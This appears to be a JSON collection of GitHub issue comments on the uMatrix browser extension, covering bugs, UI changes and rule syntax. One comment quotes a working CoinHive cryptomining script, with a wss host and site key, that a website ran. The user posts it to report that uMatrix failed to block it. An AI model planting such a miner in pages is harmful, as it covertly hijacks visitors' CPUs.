    "alberizo": "I get it, I'm stupid!! I thougth is like AdBlock system, because when you have lot of uMatrix rules is very hard the management of new add. It would be a cool feature or at least show an advice when you add it.\nThanks for response.. ",
    "BugTra": "The attack demonstrated here was tested against Firefox 53.0. I was able to execute pretty much every malicious script I throw at it.\nAm I to understand via data URI is sand-boxed well in chromium? Because it is certainly is not the case for firefox.\nThanks for hasty reply.. ",
    "ayosec": "For the record: In Firefox, setting\nsecurity.data_uri.block_toplevel_data_uri_navigations\n\nto true (in about:config) prevents the problem.. ",
    "ssolidus": "I said I tried disabling it using the power button, wouldn't that disable the ruleset?\nBy other functionality I meant referrer and user-agent spoofing.. Oh, I should have let you know that I can't test it anymore because I am locked out from that method of 2FA by Google for \"a few hours\".. \n. Hi,\nI used the logger :)\n\n. ",
    "SaphireLattice": "Can confirm this happening on Firefox Nightly 55.0a1 (2017-05-13). I don't have the \"Classic Theme Restorer\" installed but I'm using the \"developer dark\" theme, though.. ",
    "geplus": "mmm... in my case the issue doesn't happens with the downloads icon.\nI have the option \"use small icons\" enabled ,  the issue happens with this option enabled in my case.\nAnyway, thanks for your attention. ",
    "unexistance": "ESR : 45.9.0. yes I'm using custom background / foreground color in all website, in which @Atavic confirms uMatrix does not follow\nto reproduce, just set Firefox Content | Color settings are per https://imgur.com/a/zfDFU\nMay I suggest a change in the font? like bold if enabled & strike-out if disabled? or something to that effect. > then you are asking for trouble, not just with uMatrix, but with probably a lot of other web pages. I just do not have the inclination and especially that sort of free time to \"fix\" this assuming one would agree in the first place the issue is with uMatrix.\nI actually have NO trouble with other website, since it's my OWN decision to reduce web distraction this way\nGuess it's not a fix, just usability request. ",
    "bgiesing": "I just tried with Chrome's hardware acceleration on (I usually have it off cause Intel driver issues) and it works fine so it's either a browser bug like you said or a problem with uMatrix and not having hardware acceleration.\nWhere do you report bugs to Chrome?. ",
    "emersion": "My bad. I didn't realize.\nIs there a reason why the URL is not clickable, but only the arrow is?. Maybe it would make it more explict to replace the arrow by something like this: http://fontawesome.io/icon/external-link/\nThis is Wikipedia's one:\ndata:image/svg+xml,%3C%3Fxml version%3D\"1.0\" encoding%3D\"UTF-8\" standalone%3D\"no\"%3F%3E%3Csvg xmlns%3D\"http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg\" width%3D\"12\" height%3D\"12\"%3E%3Cpath fill%3D\"%23fff\" stroke%3D\"%2306c\" d%3D\"M1.5 4.518h5.982V10.5H1.5z\"%2F%3E%3Cpath d%3D\"M5.765 1H11v5.39L9.427 7.937l-1.31-1.31L5.393 9.35l-2.69-2.688 2.81-2.808L4.2 2.544z\" fill%3D\"%2306f\"%2F%3E%3Cpath d%3D\"M9.995 2.004l.022 4.885L8.2 5.07 5.32 7.95 4.09 6.723l2.882-2.88-1.85-1.852z\" fill%3D\"%23fff\"%2F%3E%3C%2Fsvg%3E. ",
    "leedoyle": "@emersion I find the arrow almost perfect, both noticeable when I look for it and not intrusive when I don't. Anyway, you are free to tweak it on your machine or fork it. . @lovetheguitar please check the logger (the black box button in the top right corner of the popup). \nProvide information what website you are having issues with. Specify functionality that's not working. . @ArchangeGabriel please pay attention to the description of the issue, not just the title. Supposing you were on youtube and blocked some domain, like ytimg, and this would cause your browser shortkeys (I'm not saying it will, let's just suppose) like ctrl+k, ctrl+s, ctrl+l, ctrl+d not to work - would you agree that'd be a bug?. Right. Sorry for the inconvenience, it didn't seem obvious to me. . @ArchangeGabriel and not just ctrl+f, but almost all browser shortcuts there is. Do you think there is a way to counter it?. ",
    "snowbound": "The thing is that if blocking of javascript for accounts.google.com is enabled in Chrome it works fine IF UMatrix extension is not  enabled in Chrome. If I enable the extension even if scripts for accounts.google.com are enable aka green in UMatrix the old login screen never is displayed. \nIf I want to see the older Gmail login I have to stop using UMatrix.\n. ",
    "caspervk": "Instead of disabling filtering for the * scope the error can also be resolved by manually adding reddit.com imgur.com xhr allow as a rule. However, as RES supports expandos for over 50 different domains, the task of adding these to uMatrix manually would be quite cumbersome compared to simply ticking the XHR-field if it could be fixed to show up.. I'm using Firefox. How come uMatrix is able to block the request then?. Is there any way to allow XHR for other extensions? The alternative is allowing XHR for the * scope.. Thank you! This resolved the issue completely.\nOf course I couldn't find any blocked requests in the logger, I was looking under the specific tab instead of All!. The logger is certainly a valuable tool when diagnosing issues; that said, the user experience could be improved significantly by integrating the filtered addon requests into the main matrix panel, as Alamei stated. The nature of addons, however, could prove this task difficult as it can be complicated to figure out which tab causes an addon to make requests.\nInstead, as one already puts complete trust in ones browser extensions, I think it would be beneficial to allow all network requests made by extensions by default.\nIs there any way to matrix-off for all extensions with one simple rule?. ",
    "Remu-rin": "Try c3b0e9a3-eec7-439d-be07-ac4cf08de79e.moz-extension-scheme * xhr allow or use the logger.\n\n. > Selecting the scope (sub-domain, domain or even a tld)\nBy the way, is that intentional? Result is com destination type action rules.\n. Your screen shows you have one of per-scope switches enabled for that page. Try disabling it. https://github.com/gorhill/uMatrix/wiki/Per-scope-switches\nDisabling the matrix only disables filtering, not other features.. >  For the latest Firefox, NoScript addon can disable JavaScript and support  HTML tags so it is using a different API?\nReally? https://hackademix.net/2017/11/21/noscript-1011-quantum-powerball-finish-and-rebooting/#comment-38450\n\n\nThe difference in site rendering when scritps are disabled is due to the  tag being disabled by the browser with the new CSP-based blocking system. I'm looking for work-arounds.. > It's somewhat confusing with Firefox shortcuts as I tried shift+f5 but it didn't do anything. Apparently a full reload in Firefox is ctrl+shift+r.\n\n\nAnd also ctrl+F5 if you like.\nNormal reload: ctrl+R or F5\nReload without cache: ctrl+shift+R or ctrl+F5. > Same could be said the other way - If the default is deny then why are these needed?\n\nTo block css and images from those known bad domains, even when they are allowed globally. And in some cases content from those domains is 1st-party scripts /XHR/etc (subdomain). Privacy.\nTo clean up matrix via moving them to the end of popup, plus making it possible to hide all of them to one string. Usability.. > Don't think you understand what default deny means as it includes 1st and 3rd party requests.\n\nDefaults of uM are not clean default deny (it would be very hard to use). It allows everything from 1st-party, plus css and images from 3rd-party. And hosts-filters are useful there. Most users don't go full default deny, even me (in 1st-party I block only scripts).\n\nI don't understand that.\n\nCompare this. Which variant is more clean and easy to use?\n\n\nOr imagine a case, when instead of beemray there would be something starting from W letter. It will be at the end of matrix (because it's sorted alphabetically), after all of those bad domains. Hosts-filters will put up neutral/unknown domains and put down bad domains.. @Thorin-Oakenpants Thanks, these short versions are very handy, didn't knew uM can accept rules like this. Blocking whole ranges is great.\nAlso strict blocking is not working for those rules when there is * 1st-party * allow, so no need for inherit rules quoted above.. ",
    "Alamei": "Out of curiosity, what changed in the code between 0.9.x and 1.0 that caused the RES addon XHR requests to be blocked by default when they were formerly allowed? My temporary workaround for this issue (before I found this thread and saw the solution) was to just roll back to 0.9.3.6, so it must have been allowing the requests through.\nSince this particular behavior adjustment isn't mentioned in the changelog (and may have been unintentional), there are likely some users confused as to why certain addons are suddenly no longer functioning correctly, and it's pretty easy to miss that fact that the requests are even being filtered because we're trying to troubleshoot the logs on a specific tab instead of the 'All' log, judging by the fact that both caspervk and I made the same mistake.\nIs there by any chance a straightforward way to integrate the filtered addon requests into the main matrix panel to allow them to be approved without hunting through the logs? I feel like the log solution is a bit complex even for the generally technically-inclined uMatrix userbase to guess without at least a hint at where to look.\n. I agree with caspervk that an option to allow all extension requests (either via a toggle in the settings or a single rule) might be an easier solution than displaying the extension requests into the matrix panel. It would essentially allow users to choose between the 1.0.0 behavior and the 0.9.x behavior\nThat said, it sounds like the behavior change disallowing the requests in 1.0.0 wasn't intentional, so a new setting may be unnecessary if a future patch will revert to the 0.9.x behavior of allowing extension requests through automatically anyway.. ",
    "LIyoai": "Ok, thanks :-). ",
    "angelsl": "Side effects: a permanent scroll bar appears even if the matrix doesn't exceed 600px in height\nI hope that is acceptable for now until the bug in Firefox is fixed.. Bugfix was merged in mozilla-central.. ",
    "2017-05-1200-11-20": "Hi There! It conflict with uBlock Origin?\nUse relax uMatrix mode \"block-all/allow-exceptionally mode\", as owner! Dont be evil \n. ",
    "iology": "@gorhill This patch makes the webext button work the same way as the legacy one. I don't know if it is unnecessarily affecting the Chrome extension. The browser cache invalidates the change of my rules.. @xofe Closed by the fix for #819: https://github.com/gorhill/uMatrix/commit/76639f528a0eb746692736b9a1ff29384182b1e2. ",
    "zero77": "@forkoz \nThanks for letting me know, ideally I am looking for a Firefox replacement for Random Agent Spoofer and Self-Destructing Cookies.\nIf you are correct then uMatrix doesn\u2019t seem like a viable replacement for Random Agent Spoofer.. I haven\u2019t found a RAS replacement with a UI on FF yet but, uMatrix may be an ok replacement for Self-Destructing Cookies because, it supports local storage, cash and cookie clearing. I tried cookie-autodelete but, theres only cookie support and it\u2019s a bit buggy although, it does have notifications which uMatrix doesn\u2019t.. @gorhill \nThis PR is also for cache and cookie clearing, should i remove the UA part.. The user agent spoofing isn\u2019t working in uMatrix because, it doesn\u2019t spoof the OS.\nFor example, https://browserleaks.com/javascript \nAlso,  #803\n. @gorhill \n\nFirefox anti-fingerprinting feature\n\nWhat feature is that.. Apologies, I will take this into consideration in the future.. I was thinking of something along the lines of:\n\ngoogle.com mail.google.com cookie,xhr,other allow\n. @ArchangeGabriel \nyes, exactly.. @gorhill \nthanks.. That\u2019s a good idea but it\u2019s not really what I was after in this request.\nI like the my rules tab and I find it easy to work with.\n\nBut, I am finding its getting a bit messy as I have lots of rules and in particular multiple rules for the same domains. \nSo I think combining rules for the same domain would solve this and make the my rules tab a lot neater and easer to work with as a result.. Yes, It would be nice to have control over allowing or blocking indexedDB storage throw the popup panel and auto clearing of indexedDB storage, if that\u2019s what you were thinking.\nAlso, I think this API will be supported from the 23rd in the main FF release.\nhttps://wiki.mozilla.org/RapidRelease/Calendar\n. This may not currently be possible in chrome but it should work well in FF.\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=78093. Thanks. ",
    "Neui": "Another way this could be done is that both the background and text color are set explicitly. I didn't chose to do this because this was the only text field where it is partly explicitly set, so I took the easier route (this PR). Maybe every textareas and buttons could be set explicitly (via a global style) so it is more consistent with the background, and you can do the visual hint.. So you mean something like this?\nBG | Native <textarea> color | rgba(127, 127, 127, 0.1) | Real <textarea> with a=0 BG (| User)\n\nIt might work, but it would be somewhat harder to set up. Also it seems you need to set RGB explicitly before being allowed to set alpha, thus losing the native color. So I'd guess it would be easier to explicitly set both the background and text color for every textareas:\ntextarea { background: white; color: black }\n#diff textarea { background: gray; }\n\nYou would use the native colors, but the site is bright anyway, so it would be more fitting.. ",
    "JudasRose": "Yep that did it. Is this just if it's an Iframe though or any type of change i need to do a force reload. Possible to just do that by default as an option?. ",
    "DabeDotCom": "I see you already had all this, but removed it in be3e86e055f05e80bdc7c98804e9c2cb1a616872.\nSorry to salt an old wound...  :-}. ",
    "ruv": "What was the reason to remove auto-reload option?\n[update]\nI see the reasons, [1].\nDoes some reason exist to don't have this option in principle?\n(except the mentioned \"Do not open feature requests. I just do not have the time.\" [2])\nSee also: pull request #814 \u2014 at least, we don't need to click two times ;). > uMatrix remembers the last scope (\"namespace\") you selected, and pick this one by default. \nThe main issue is that the current behavior is not predictable (if you don't know about it). When you open uMatrix, it is connected to the current tab (and domain), and you don't expect that the changing domain from another tab (it is not obvious that you are actually changing the global default scope level) will affect the level in this tab too.\n. Another way to implement changing scopes is to use logic of radio buttons, with different display form.\nThe three state for developer.mozilla.org domain can look something like:\ndeveloper.mozilla.org * \u2014 full domain name is selected\ndeveloper.mozilla.org * \u2014 second level domain is selected\ndeveloper.mozilla.org * \u2014 any domain is selected\nSo, for this case we have logically three parts: \"developer\" \"mozilla.org\" and *. But when \"developer\" is selected, the full domain name should be displayed as selected.\nAlthough, I don't sure that the star after name is understandable enough.\nUnchecked part can be shown as gray (or not so contrastively).\nA screenshot from Stylus addon: \n. > Now there are toggle buttons, that are still cryptic.\n@gcb, do you mean the shown state or the behavior (i.e. interaction for changing state).\n@gorhill, one additional idea regarding interaction. In terms of radio-button (and internal logic) we have set of the options and only one of them can be checked (i.e. has the \"checked\" state). When you click on the option that is already checked \u2014 nothing is happening.\nPerhaps for this special control element (that doesn't look like classic radio-buttons), the following behavior will be more usable, especially for the new users. When user clicks on the option that is already checked, the option at the right becomes checked; if no option at the right (i.e. in case of *) , the most left option becomes checked. In such case the checked option should become paler on hover (since unchecked options become brighter on hover).\n. > people think they have to click on it, while you can click anywhere in the title bar.\nI thought this too even on PC ;)\n\nwhat about having a highlight colour when you hover over it on the PC?\n\nDefinitely. Also, it will be in accordance with other active elements \u2014 almost all of them have reaction on hover.\n. Actually build  should be marked as PHONY target since it is not a file name.. ",
    "gcb": "added translations for the languages i know. (though i am on beginner level for Japanese and Chinese, someone might want to double check those). @gorhill I added reloadOnSave as an option, disabled by default.. feel free to merge wherever. It is a very easy patch to apply (only 4 lines of actual code change. Thanks gorhill for such a tidy code base!)\non the UI translations i cannot guarantee for chinese. i am barely a beginner.. IMHO, the old dropdown was OK\nThe only problem there was that it was cryptic. Now there are toggle buttons, that are still cryptic. Well, only for subhostnames. The * at least is pretty clear now \ud83d\udc4d . @ruv I meant both. A dropdown is perfectly fine UX element for both showing the current state and showing that there are options. But it must at least look like a dropdown.\nIMHO the old dropdown was perfect, it just didn't look like a dropdown, and that was the source of all this mess. And instead of just making it look like a dropdown (i sent a patch, it was literally 1 line of CSS to show a down arrow!) we went down this rabbit hole of inventing a new UX element, that is a cryptic as a dropdown that doesn't look like a dropdown.\nYou can think of the functionality of a dropdown, when placed on a top level like this, as being the same as tabs, but using less space. It shows you that there are more options, but that the currently selected one is dictating the content you are seeing.. /me facepalm\nwill add back if reopen. ",
    "themightyoarfish": "\nForce reloading does not change anything\nA new profile with only uMatrix enabled does not exhibit this behaviour\nMy ruleset blocks no domains github makes requests to\nReloading the page in the logger initially showed only few requests and didn't show any blocked ones, but now suddenly shows many more, and also some blocked google domains. The webpage is now back to working as expected.\n\nI really have no idea, what the issue is, but it turned out I had User-Agent switching enabled which was causing this issue.\nThank you for your time.. ",
    "dessant": "@gorhill, in case you want to post a standard reply to support requests and close/lock them, I've made a bot for it: https://probot.github.io/apps/support/.\nAt Kivy we use it with this message: https://github.com/kivy/kivy/blob/master/.github/support.yml#L7.. ",
    "Xmetalfanx": "just throwing in two cents as I just watched https://www.youtube.com/watch?v=PSoUPM520h4 AND I do agree that un-needed lists in UBO and/or UMatrix are not needed if they are already dealth with (the mining domains) but I saw https://github.com/keraf/NoCoin/blob/master/src/blacklist.txt mentioned.   I WOULD like to see the maintainer get credit for that list, wondered if (this may be better in here then in UBO, though i may have the idea backwards) adding this list to the default list (I know i could probably custom add it, but I mean as an \"official addition\" would be a decent idea.\nA) I know some of the other lists may have some of these domains listed but perhaps not all \nB)I do see this as \"closed\" and I do not want to/intended to add to \"drama\" or anything ... if the answer is \"No\" , than no problem.. ",
    "mkahvi": "Unfortunately the following is not blocked by uMatrix :C\n\n< !---->\n\u00a0 \n\u00a0 \n\u00a0 CoinHive.CONFIG.WEBSOCKET_SHARDS = [[\"wss://gofile.io:8889\"]];\n\u00a0 var miner = new CoinHive.Anonymous('4AHC2KbuTDz19FG6coUHkyXyyyTo2tavmhztoCdPLhJaeyVKebrgHtq1rJNWHU31TY5S2WdMFVM3kZao5pNRj9gsCQx2hdx', 'gofile');\n\u00a0 miner.start();\n\u00a0 \n\u00a0 < !--\n\u00a0 CLOUDCOINS.Miner(SdFE5ucCVy2qGUXDygZTVJhiESE81g75).start();\n\u00a0 -->\n. \n",
    "Anden": "You mentioned in your commit that it is sometimes necessary to do a full reload, do you know more exactly when it is necessary? I know how you feel about wasting your time, so if you don't know I'll run some tests myself.\nIn any case, thanks for the quick response and for your great add-ons!. Ok, thanks a lot!. ",
    "theWalkingDuck": "@uBlock-user \nThat's intentionally done to show the Default scope level (Site, Domain or *).\nIf you don't like it, go to  uMatrix Dashboard > Settings  and  set the  Default scope level:  to Site.\n@gorhill\nthere is still a UI DOM refresh problem\n- visit some sites (wikipedia.org, mozilla.org ....) \n- open the uMatrix Dashboard\n- open the uMatrix window (the Scope is: behind-the-scene)\nEven if we're in the behind-the-scene scope, you can see that wikipedia.org, mozilla.org .... are listed in the UI.\n. @gorhill\n:( \nNo. Please not !\nSelecting the scope (sub-domain, domain or even a tld) just by clicking the scope field fits exactly the uMatrix way. ..... It's a move in a right direction and user friendly.\nI think his problem is more a question of appearance, not usability.\n... may be you can make him happy by using some shades of blue color (like #7788EE) instead of graying it out.\n. The scope selector is now clickable.\nyou can click on it to select the sub-domain, domain or the tld. \nor you can set the global scope by clicking the [ * ] icon on a Menu-Bar.\naddons.mozilla.org\n       mozilla.org\n              .org\n                 *\nsub-domain  addons.mozilla.org\n\ndomain             mozilla.org\n\ntld                       .org\n\nglobal-scope *\n\nfor futher information please reffer to:\nhttps://github.com/gorhill/uMatrix/wiki/The-popup-panel\n. That privileged page uses Google-Analytics and the best thing you can do is to remove the link to AMO site or to remove the whole \"Get Add-ons\" panel.\nSteps to remove the \"Get Add-ons\" link:\n\nopen about:config\nsearch for  extensions.webservice.discoverURL\nremove the URL (set the value to empty string)\n\nor you can go a step forward and remove the whole panel\n\ncreate a new boolean preference extensions.getAddons.showPane\nand set it to false\n\nmore info at:\n    https://github.com/ghacksuserjs\nghacks-user.js\n    user_pref(\"extensions.getAddons.showPane\", false); // hidden pref\n    user_pref(\"extensions.webservice.discoverURL\", \"\");. btw, this is easily reproducable just by setting the option to \"Show a blank page\" when Firefox starts.\nThe URL in this case is about:blank but it seems uMatrix can't see/find the scope.\nOn the other hand if I open about:blank manually, uMatrix sets the right scope (blank.about-scheme).\n. I have no issue when I click \"new tab\", uMatrix sets the scope newtab.about-scheme.\nI see the message \"No web page found\" only with the setting Show a blank page when Firefox starts.\n. With the new release uM 1.1.20, the issue with firefox seems to be resolved now.\nTested on FF57, 58 + 59.\nThank you !\n. What about using  matrix-off: behind-the-scene false instead of behind-the-scene * * block ?. The click to select or to deselect the scope is fully in the spirit of uMatrix \nas the click to allow or to block a content.\nI have a problem with the idea to bring back that clunky dropdown menu again.\n. uMatrix is working properly. Cookies are not leaving your browser at all.\nThe  value of the Drop Down menu is not set by the DDG server, it's set by a local script \nthat reads the cookie and changes the value  of the Drop Down menu after the page is loaded. \n. A clean solution would be adding a title attribute whenever the host name exceeds a certain length.\n<div title=\"bw-1651cf0d2f737d7adeab84d339dbabd3-bwcore.s3.amazonaws.com\" class=\"matCell ....\">\n    <b>bw-1651cf0d2f737d7adeab84d339dbabd3-bwcore.s3.amazonaws.com</b> \n</div>. ",
    "LeafG": "\nSupport is dropped for Firefox legacy.\n\nSeaMonkey and Pale Moon are not firefox. They are legacy in the sense they offer more control for their users. \nI would repeat an argument I made long while ago, regarding the same issue about uBlock:\nWhy would the minority (of users who wish to use such browsers) lose a valuable tool?\nOne can argue that Firefox's way is the right one, but don't we, users of other browsers have a right to enjoy the same protection as FF and Chrome users?\nI did not mean to duplicate a previous issue. I meant my issue as a request to you:\nPlease, keep supporting these browsers for the sake of such users who wish to keep away from the main stream FF and Chrome.\n. Sorry, this wasn't meant as an argument, and I do respect both your time and your contribution to us, users.\nI simply wanted to highlight an angle.\nThank you again for your hugely valuable tools.\n. ",
    "ashesall": "Hi, I currently have uMatrix v1.1.8 installed on Firefox mobile. I'd like to report a few issues related to the recent changes:\n1. Unable to scroll on the matrix tab on v1.1.8. Default view only shows up to the css column.\n2. Cannot zoom out (pinch-to-zoom).\nMinor request:\nPlease consider increasing the sizes of the boxes by a few millimeters or px. I sometimes have a difficulty tapping the halves of the boxes. \nYou mentioned that you will be removing the misleading gear icon on the status bar; It's still on the status bar on v1.1.8. Thank you for supporting Firefox mobile!\n. Hi, it seems that the only problem is that I cannot scroll horizontally; vertical scrolling works. Is it possible to fit-to-page the whole matrix and make it the default view? I think, coupled with a considerable increase in the height of the boxes to facilitate tapping, it will be great. Thank you!. Thanks a ton! I'm trying it out now and it's so much easier to tap. Yeah, I think a little adjustment to the icon spacing is needed to prevent tapping the wrong icon. I sometimes hit the erase icon instead of the save/lock.\nAlso, a minor cosmetic one. Long domains/urls do not fit in the boxes and they overflow to the other columns. You can still tap on the boxes though so no problem (extra long urls are rare, too).\nThanks again!. Hi, I currently have v1.1.11rc0 installed. Thank you for improving the Options page for mobile! There is, however, a no-horizontal-scrolling issue on Options and cannot scroll past the Host files tab. The My rules tab tables are also too close to each other, making them appear squashed together. Thank you! . ",
    "ShaunLeeClarke": "I never even noticed the gear icon. My vote would be to keep it - otherwise if I hadn't read this and it was removed I never would have known it was there - and it's actually quite handy now that I do know. To make it more obvious that the row is clickable, what about having a highlight colour when you hover over it on the PC?\nIf users then go from the Android version after using the desktop version, they may then know the row is clickable.. If you click and drag in the uMatrix window, it is possible to select text just as if it was a standard HTML page, which seems undesirable in what I feel should act more like an application than a webpage. Can attach a screenshot if you can't reproduce.. :). > @ShaunLeeClarke, just to be sure... I usually advise to not go full granular like I see in your screenshot, but rather keep that level of granularity for only when it's necessary.\nI'm with you. I think I just started out this way, I don't mind. Interesting to see all the parts that make up a page :).. ",
    "bjoe2k4": "referrer-spoof: google.com false does the job with Google 2FA. (in combination with a few script and cookie allows). ",
    "Bundy01": "Sorry but with version 1.1.11b0, I have the same problem. ",
    "mspielberg": "I've had uMatrix installed for at least the last few days, so no, I did not start uMatrix after page load. I tried reloading via F5, but I don't recall if I tried opening a new tab, new window, restarting Firefox completely, etc. I'll investigate and see if I can reproduce in a fresh browser instance.. ",
    "dkrm0": "I have the same issue but for me it appears on every sites, even after multiples page reload or firefox reboot. :/\nBut curiously, the icon display the number of allowed requests: https://imgur.com/OcX0zZn. ",
    "SlavicB": "Managed to reproduce by changing the browser's 'Accept cookies from websites' setting.\nhttps://i.imgur.com/CS3d46r.png\nWhen unticked the popup panel is blank on all sites.\nIt was working previously and then (must be an update) stopped.. ",
    "cedricbonhomme": "I confirm the comment of @SlavicB .\nI have to tick 'Accept cookies from websites' in the configuration of Firefox. Else the pop-up panel is blank on all web sites.. I just did an update of uMatrix today. This should probably be related.. When 'Accept cookies from websites' in unchecked, in the browser console of Firefox the message below is displayed when I click on the icon of uMatrix.\nbash\nSecurityError: The operation is insecure.  popup.js:38\n    <anonymous> moz-extension://0deb699d-4659-4b18-8a89-b2a2b9fa99c0/js/popup.js:38:9\n    <anonymous> moz-extension://0deb699d-4659-4b18-8a89-b2a2b9fa99c0/js/popup.js:37:2\n    <anonymous> moz-extension://0deb699d-4659-4b18-8a89-b2a2b9fa99c0/js/popup.js:30:2\nNo error in the console when 'Accept cookies from websites' is checked.. You're welcome. I am fan of your extensions :-). Just updated. This solved the problem for me. This was a very quick fix. Thanks a lot!. ",
    "seniorpandabear": "Hello!\nI have a similar problem while using Chrome, which renders the plugin unusable. It looks like this\nfor every single website:\nhttps://i.imgur.com/jJptvCQ.jpg\nThe interface was degrading slowly. First, only the numbers started to disappear\nfrom the dropdown interface. I kept using it since it was still fairly usable.\nNow however, I cannot set anything up for new sites. Old filters still seem to work.\nAlso, the Privacy tab has entirely disappeared from the settings menu.\nI have tried to clear the browser's cache, temporary files, removing and readding the extension, resetting the extensions settings. Nothing has worked. I have all cookies enabled in the browser, so my problem does not seem to be solved in the same way as previous posters.\nThank you in advance!\nEdit: I have disabled Chrome's extension auto-updating now. Did not realize this was going on. \nThis explains the erratic and deteriorating behavior recently, and is why I don't like updating software that is \"working fine\" already.\nwipes sweat from forehead\nEdit2: I have downgraded to version 1.1.0. Everything now works correctly again. So the issue is then in the past few updates. (missing numbers in the menu, and latest patch missing everything). Thank you for your reply.\nBy \"missing numbers\" I mean that when you click the button to bring out the drop-down uMatrix interface, there would usually be little numbers next to the top row buttons/icons (Disable/Enable matrix, Revert changes, etc). However these started disappearing a while ago. I'm guessing a few patches ago.\nMy chrome version is  39.0.2171.95 m.\nCertain sites have a way of blocking you out when you use an older browser, so I made good use of the UA-spoofing function to pretend I'm on a later browser. I was thinking the missing numbers, broken interface, missing Privacy tab then missing spoofing function was caused by file corruption. But apparently it was just the updates! :) \nI thought it would be cool to keep/reintroduce that UA-spoofing function, even though it won't be carrying out its intended purpose for privacy, it is still useful for tricking certain sites (such as YouTube) that you're using a newer browser. Perhaps with a \"Use at your own risk!\"-disclaimer, saying that it's more of a gimmick and in some cases will actually leak the real UA, but that some people could still find it useful to bypass basic \"old browser\" blocks on websites.. Hmm, what changed recently to make it incompatible with version 39? It was working fine up until a few days ago. I think it was patch 1.1.14 that broke it entirely.\nI use this version on one of my machines that has a very weak CPU. The later chome versions use 16-26% cpu when idle, while this version uses only 2-3%.. I don't know much about programming but sounds like it would add unnecessary extra work for you to fix this, so I completely understand if you want to use your time and coding syntax in a more time-efficient manner - Thank you still for this great extension! (and that you took the time to reply). ",
    "T-vK": "Using a 3 years old browser is absolutely insane. I see no reason to support that. The list of known critical exploits is longer than you could possibly imagine. \nI say, support the latest 3 versions and be done with it. Maybe also support Firefox ESR.\nInstead of polyfilling you could also transpile using babel for instance. And you could also use code optimizers like the closure-compiler to improve performance. Using gulp you can fully automate the process, so there would be no \"burden\" anymore.. ",
    "foo4thought": "\nwas supposed to be part of the original submission. ",
    "ravenise": "I am having the exact same problem in windows 7 in firefox 57!\n\n. Note the new asterix beside the dropdown in the latest version of uMatrix; am I missing something?  Not sure; they have not updated the global section in the user guide however; they still show the old drop down menu there.. Found the solution, simply remove the following from Umatrix rules:\nmatrix-off: * true. Quite possibly, though could be due to malware or hackers. ",
    "popveneer": "I can confirm the same issue in Firefox 57.0.3 (64-bit), UMatrix1.2.0:\n\n*the screen clip shows full visible uMatrix popup panel.\nInterestingly the scroll bars appear for both horz and vert and are usable but disappear immediately when  the uMatrix hovered over.  The issue has affected me for at least the last year though and is intermittent.\nHope that's helpful or at least cathartic.  It sounds like it's all in the browser unfortunately.\n. ",
    "kavenstein": "Firefox 58.0.2 (64-bit) on xubuntu linux 16.04:\nTwo behaviors:\n1. When the UMatrix icon appears on the toolbar to the right of the address bar, clicking on it results in expected behavior with all UMatrix elements visible and selectable. All good!\n\nWhen the firefox window is resized horizontally (to make it narrower) until the UMatrix icon is no longer visible and replaced by a >> button, then clicking the >> button to expose the UMatrix icon and clicking the UMatrix icon causes Umatrix to display its window with controls showing on the left 2/3 and masked out on the right 1/3 of the window.\n\nThe bad behavior only happens when the window is resized enough for the UMatrix icon to disappear. It still works fine if the >> button is showing AND the UMatrix icon is still visible.\n\n\n. ",
    "vrobolab": "Let it be one more hobby, I do not force you to sign any contracts and work full-time. However you could make Firefox users more secure and will earn some good cash. For my plugin a deep understanding of how Firefox works is needed, because plugin must intercept and block network requests on the low-level, and I believe you are the optimal candidate for such task as your plugins work in similar way.\nLet me show you the concept and you will decide if you are interested or not.\nYou could give me some temporary email, e.g. from 10minutemail.com. Because I am paranoid and I do not want big brothers such as Mozilla Corporation know about my involvement in this extension :) \nI still do not believe in their good intentions of creating the thing I want to fight with this extension.. ",
    "Certary": "Thanks for the quick responses! And sorry for not finding the existing issues ;)\n@gorhill The link you're providing in your response to #54 is broken.. ",
    "Diego-BF": "Thanks for the suggested workaround @gorhill , but it didn't work even in a new profile only with UMatrix.\nNow I have a question, if you don't mind: UBlock Origin in Advanced Mode have the desired behavior when set to show only domains when I go to a private window. Why is it possible? Does he not suffer from the same bug?. > Because the default in uBO is to not show all subdomains\nBut if I set uBO in Firefox to show all subdomains and go to a private window, in my current and in a new profile, it keeps showing all the subdomains.. Ok, thanks for the clarification!\nI thought of an alternative that I don't know if it would be cumbersome and possible to implement.\nTransform the \"collapse/show all\" to a user setting (maybe even putting an option in settings to set if the user want to show or collapse all in the panel by default) and keep the independent collapsed/show domains as a UI setting that, if setted by the user, overrides the collapse/show all.. ",
    "micah": "Alright, but I was wondering how you pronounce it.  After all, I don't want to have a 'GIF' situation on our hands.. i stick with 'um, a tricks' thank you very much.. ",
    "JimDop": "UPDATE:\nOK , here's the deal.   Your own program is blocking itself if you use a GLOBAL  Dontallow and include XRH   as blocked .  Kind of silly , but even worse, no indication of any kind that that is what is happening under the hood  . How about a popup indicated that HOST file updating is disabled when attempted under these conditions.\n------------------------------original reply------------------\nI tested Umatrix on a clean profile, and it seems to load the latest  MVPS file.\nSo what is blocking the loads on my normal profile, which was only recently created in honor of the FF 57 release?\nHaving NO other issues that would suggest some systemic problem on my end \nhttps://imgur.com/a/lkSia. ",
    "zippit": "I have the same problem with update 1.1.14.  My settings are like the second list shown above with only one difference.  The first two entries are both set at true.  \nThe final entry is like the last entry in the first list at network.cookie.cookieBehavior=2\nThat is the entry that disables cookies.   When I change it to 1, the uMatrix extension shows the entries in the popup, but enables cookies. \nIt was working fine before the update.  This is happening on 2 different PCs.. No problem.  This is a great extension!.. ",
    "lb7jf47wpqcn": "Hello!\nI am not using any custom browser settings, I am using Firefox 57.0.1 on Arch Linux. I tried with a fresh browser profile but the issue was still there. My uMatrix version is 1.1.14. Interesting I noticed that my other profile has updated uMatrix to version 1.1.16 and the issue has disappeared so I will wait for the update on my other profiles.\nThank you for the support and sorry for the inconvenience.. ",
    "Eriton33": "I tried to replicate the problem and found out that it does indeed have to do with the filters being updated.\nOn my (arch) linux system the problem seems to be that the filters are reset after firefox is restarted. On windows the filter update seems to work just fine.\nWhen disabling all filters, I noticed that the \"Apply changes\" button steys grey/inactive and the changes to the filter list cannot be applied. This might also explain why the updated files are not saved when firefox is restarted. This leads to the described behavior, where uMatrix reconnects to the update servers at every start of firefox. However when I tried to replicate it on Ubuntu 17.10 this issue did not exist and uMatrix works as expected. Therefore I suspect this has to do with some distribution dependend feature like apparmor which might prevent uMatrix to save the changes after updating the filter lists.\nI will try to figure out what feature causes this behaviour and what linux distributions are affected. To better understand what is happening, could somebody please tell me where on a linux system uMatrix tries to save those files?\nThanks . ",
